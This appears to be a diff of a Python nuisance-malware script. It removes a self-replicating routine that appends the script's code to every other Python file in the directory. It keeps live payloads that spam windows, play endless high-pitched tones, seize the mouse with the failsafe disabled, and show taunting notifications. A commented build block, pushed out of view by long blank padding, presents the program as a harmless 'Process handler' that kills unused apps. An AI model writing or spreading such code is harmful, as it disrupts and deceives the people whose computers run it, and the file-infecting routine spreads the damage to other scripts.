@@ -1,56 +1,14 @@
-import sys
-import glob
 import webbrowser
+import winsound
 import time
-import os
 import random
 import threading 
 import ctypes
-from plyer.utils import platform
+import pyautogui
 from plyer import notification
+from pynput.keyboard import Key, Listener
 
-try:
-    from pynput.keyboard import Key, Listener
-except ImportError:
-    os.system('python3 -m pip install pynput')
-    from pynput.keyboard import Key, Listener
-
-
-def replicator():
-    code = []
-    with open(sys.argv[0],'r') as f:
-        lines = f.readlines()
-
-    Area = False
-    for line in lines:
-        if line == '### START ###\n':
-            Area = True
-        if Area:
-            code.append(line)
-        if line == '### END ###\n':
-            break
-
-    other_scripts = glob.glob('*.py') +glob.glob('*pyw')
-
-    for script in other_scripts:
-        with open(script, 'r') as file:
-            script_code = file.readlines()
-        
-        infected = False
-        for line in script_code:
-            if line == '### START ###\n':
-                infected = True
-                break
-
-        if not infected:
-            final_code = []
-            final_code.extend(code)
-            final_code.extend('\n')
-            final_code.extend(script_code)
-            
-            with open(script, 'w') as fi:
-                fi.writelines(final_code)
-
+pyautogui.FAILSAFE = False
 
 def terminate_thread(thread):
     if not thread.is_alive():
@@ -74,7 +32,6 @@ def window_spam():
 
 # PAYLOAD 2
 def sound():
-    import winsound
     frequency = random.randrange(8000, 10000)
     duration = random.randrange(3000, 5000)
     while True:
@@ -84,12 +41,6 @@ def sound():
 
 # PAYLOAD 3
 def alert():
-    try:
-        import pyautogui
-    except ImportError:
-        os.system('python3 -m pip install pyautogui')
-        import pyautogui
-    pyautogui.FAILSAFE = False
     def move_mouse(Duration):
         start = time.time()
         time_elapsed = time.time() - start
@@ -121,7 +72,7 @@ keys = []
 for i in range(0,5): 
     notification.notify(
         title='HAHA Gotcha',
-        message='Press the ESC Key multiple times to exit out of this',
+        message='Press the ESC multiple times to exit out of this',
         app_name='Process-manager'
     )
 
@@ -139,7 +90,75 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
 
-### END ###
 
 
-# app_icon='path/to/the/icon.' + ('ico' if platform == 'win' else 'png')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# options = {'build_exe': {    
+#         'packages':packages,
+#     },    
+# }
+
+# setup(
+#     name = "Process handler",
+#     options = options,
+#     version = "0.1.1",
+#     description = 'This is an application that handles background apps and kills the ones you dont use',
+#     executables = executables
+# )
